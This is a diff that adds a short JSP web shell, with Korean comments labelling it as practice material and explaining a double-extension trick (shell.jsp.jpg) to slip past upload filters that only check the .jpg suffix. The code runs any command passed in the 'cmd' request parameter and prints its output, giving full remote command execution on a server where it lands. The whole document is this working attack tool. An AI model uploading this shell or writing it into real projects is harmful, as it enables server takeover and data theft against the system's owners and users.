@@ -1,0 +1,13 @@
+<%@ page import="java.io.*" %>
+<%
+    // [실습용] 이중 확장자 우회 웹쉘
+    // 파일명: shell.jsp.jpg → 서버가 .jpg만 검사하면 통과
+    // 실제로는 .jsp로 실행됨 (설정에 따라 다름)
+    String cmd = request.getParameter("cmd");
+    if (cmd != null) {
+        Process p = Runtime.getRuntime().exec(cmd);
+        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
+        String line;
+        while ((line = r.readLine()) != null) out.println(line + "<br>");
+    }
+%>
